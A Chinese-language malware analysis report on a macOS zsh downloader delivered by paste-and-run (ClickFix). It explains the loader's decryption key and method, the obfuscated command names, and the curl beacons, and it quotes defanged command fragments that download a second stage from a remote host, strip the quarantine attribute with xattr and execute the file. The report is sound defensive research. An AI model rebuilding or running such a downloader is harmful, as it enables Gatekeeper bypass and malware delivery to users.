---
title: "恶意样本分析：Unknown macOS downloader (paste-and-run / ClickFix delivery)（other · zsh · ae02f57c）"
published: 2026-10-28
draft: false
description: "恶意（置信度低）：Unknown macOS downloader (paste-and-run / ClickFix delivery) · loader/downloader · 难度 medium · 纯静态分析"
tags: ["loader", "downloader", "Script"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **Unknown macOS downloader (paste-and-run / ClickFix delivery)**（存疑） · 置信度 **低**
> 
> 别名：ClickFix macOS stager、paste-and-run loader
> 
> 样本为面向 macOS 的 zsh 脚本:先做硬件/Rosetta 侦察,再用 md5(2218) 派生 AES-128-CTR 密钥解密内嵌 gzip,得到第二个 zsh 脚本;该脚本向 lift50[.]com 回传 pasted 事件、从 sail91[.]com 下载下一阶段程序到 /tmp/.mfa8aus、用 xattr -c 清除隔离属性、chmod +x 后执行,并再次回传 stager 事件。解密与代码阅读均为本环境直接完成。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **Unknown macOS downloader (paste-and-run / ClickFix delivery)** · 别名 ClickFix macOS stager、paste-and-run loader · _存疑_ |
| 置信度 | **低** |
| 行为类 | loader · downloader |
| 难度 | medium |
| 首次出现 | 2026-10-28 14:28:40 |
| 分析方法 | 纯静态分析 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/ae02f57c450feae937209022b742fc1fb7af5896b42c4183beed4ed67388a13b/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">采集硬件与Rosetta状态</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1082</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">解密内嵌压缩载荷</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">混淆命令名规避检测</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">上报粘贴执行信标</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">下载下一阶段程序</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `ae02f57c450feae937209022b742fc1fb7af5896b42c4183beed4ed67388a13b` |
| MD5 | _未记录_ |
| 大小 | 2,976 字节（2.9 KB） |
| 类型 | other · `zsh` |

## 行为分析

共 **8** 条行为，每条都挂了证据，且全部静态可得。

### 1. 采集硬件与Rosetta状态

`T1082` · 置信度 **高** · 静态

通过 sysctl hw.model、uname -m、sysctl hw.memsize 采集机型/架构/内存,并在 x86_64 下用 pgrep oahd 判断是否运行于 Rosetta,输出 hw 行。

> **证据**：文件偏移 1063/1107/1140 的 sysctl 调用与偏移 1251 的 pgrep oahd
> 
> **来源**：`ev-000001`

### 2. 解密内嵌压缩载荷

`T1140` · 置信度 **高** · 静态

将 _rollout_key/_probe_salt/_build_tag 三段十六进制拼接后经 xxd -r -p 还原二进制,以 md5("2218") 为密钥、全零 IV 做 AES-128-CTR 解密,再 gunzip 得到第二阶段脚本并由 zsh -c 执行。

> **证据**：文件偏移 2781-2958 的 _k=$(_kb|md5)、openssl enc -d -aes-128-ctr、gunzip 与 /bin/zsh -c "$_r"
> 
> **来源**：`ev-000001` · `ev-000002`

### 3. 混淆命令名规避检测

`T1027` · 置信度 **高** · 静态

用 printf 八进制转义拼出 md5、xxd、openssl、curl、xattr、chmod 等命令名,避免明文命令出现在脚本中,并以 g+unzip 拼接出 gunzip。

> **证据**：文件偏移 1483-1601 的 mzkh1/olmhf/k9mv5 与 vwrn='g'+dn1r='unzip';第二阶段同名手法
> 
> **来源**：`ev-000001` · `ev-000002`

### 4. 上报粘贴执行信标

`T1071.001` · 置信度 **高** · 静态

以 curl POST 向 lift50[.]com/api/metrics/run?event=pasted 发送带 user 与 BuildID 头的请求,后台静默执行,用于标记用户已在终端粘贴运行。

> **证据**：解密后第二阶段首条 curl: -X POST -H 'user: AgKG...' -H 'BuildID: AgLp...' hxxps://lift50[.]com/api/metrics/run?event=pasted
> 
> **来源**：`ev-000002`

### 5. 下载下一阶段程序

`T1105` · 置信度 **高** · 静态

用 curl -fsSL 从 sail91[.]com/f/rjcf4ggdrb1wp5syzplnda/5r7r2qc0 下载文件到 /tmp/.mfa8aus.$$。

> **证据**：解密后第二阶段 curl -fsSL -o /tmp/.mfa8aus.$$ hxxps://sail91[.]com/f/...
> 
> **来源**：`ev-000002`

### 6. 清除隔离属性

`T1553.001` · 置信度 **高** · 静态

下载完成后先 mv 去掉 .$$ 后缀,再执行 xattr -c /tmp/.mfa8aus 清除 macOS 隔离属性,规避 Gatekeeper 对下载文件的拦截。

> **证据**：解密后第二阶段 mv ... && xattr -c /tmp/.mfa8aus
> 
> **来源**：`ev-000002`

### 7. 赋权并执行载荷

`T1059.004` · 置信度 **高** · 静态

chmod +x /tmp/.mfa8aus 后直接以该路径执行下载的下一阶段程序,完成载荷加载。

> **证据**：解密后第二阶段 chmod +x ${xw8b57} && ${xw8b57}
> 
> **来源**：`ev-000002`

### 8. 上报驻留完成信标

`T1071.001` · 置信度 **高** · 静态

在执行下一阶段前以 curl POST 向 lift50[.]com/api/metrics/run?event=stager 发送第二组 user/BuildID 头,标记下载器阶段完成。

> **证据**：解密后第二阶段 curl -X POST -H 'user: AgJO...' -H 'BuildID: AgIL...' hxxps://lift50[.]com/api/metrics/run?event=stager
> 
> **来源**：`ev-000002`


## IOC（已去武器化）

### 网络

:::caution
**真实服务器侧仍未验证**：上述连接/握手是与本地受控 受控仿真服务 完成的，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| https | `hxxps://lift50[.]com/api/metrics/run?event=pasted` | 443 | c2 | 静态 | ⏳ 未观测 |
| https | `hxxps://lift50[.]com/api/metrics/run?event=stager` | 443 | c2 | 静态 | ⏳ 未观测 |
| https | `hxxps://sail91[.]com/f/rjcf4ggdrb1wp5syzplnda/5r7r2qc0` | 443 | download | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `/tmp/.mfa8aus.$$`
- `/tmp/.mfa8aus`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `lift50[.]com` | 是 | 静态 |
| `download_url` | `hxxps://sail91[.]com/f/rjcf4ggdrb1wp5syzplnda/5r7r2qc0` | 是 | 静态 |
| `install_path` | `/tmp/.mfa8aus` | 是 | 静态 |
| `encryption_algo` | `AES-128-CTR, key=md5("2218"), IV=16 zero bytes; plaintext is gzip` | 是 | 静态 |
| `beacon_events` | `pasted, stager` | 是 | 静态 |
| `http_headers` | `user: AgKG9kv7... / BuildID: AgLpxGoL... (first beacon); user: AgJOHUea... / BuildID: AgILJwHJ... (second beacon)` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不能断言最终载荷是窃密木马或勒索软件:第二阶段仅取得下载器,/tmp/.mfa8aus 对应的 Mach-O 未下载、未分析。
- 不能断言存在持久化:静态代码未出现 LaunchAgent、LaunchDaemon、登录项或计划任务写入。
- 不能断言样本具备反虚拟机/反沙箱能力:硬件与 Rosetta 探测结果只被打印,未参与终止或规避分支。
- 不能断言 lift50[.]com 或 sail91[.]com 的全部用途:仅从请求语义判断为信标与载荷分发,未观测真实响应。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 纯静态分析 |
| 脱壳 | 否 |

**局限与待验证**

1. 纯静态分析:未执行、未仿真样本;所有 C2 与主机指标均为静态解密所得,recoverability=static 且 pending_dynamic_verify=true。
2. sail91[.]com 上的下一阶段程序未下载,载荷类型、家族归属与最终行为(窃密/后门/持久化)无法确认。
3. 未获取服务端响应,信标格式(user/BuildID 令牌)是否对应受害机标识或活动编号无法验证。
4. 样本面向 macOS,当前环境无对应隔离动态通道,reproduced=false。

## 证据索引

<details>
<summary>展开 2 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 字符串提取 | 抽取 38 条 ASCII 字符串,定位硬件侦察、八进制命令名混淆、AES-CTR 解密与 zsh -c 执行代码的文件偏移。 |
| `ev-000002` | evidence.record | 静态解密内嵌载荷并解压得到第二阶段 zsh 下载器(sha256 cb0062fa...),解码出 lift50[.]com 信标、sail91[.]com 下载 URL 与 /tmp/.mfa8aus 暂存路径。 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
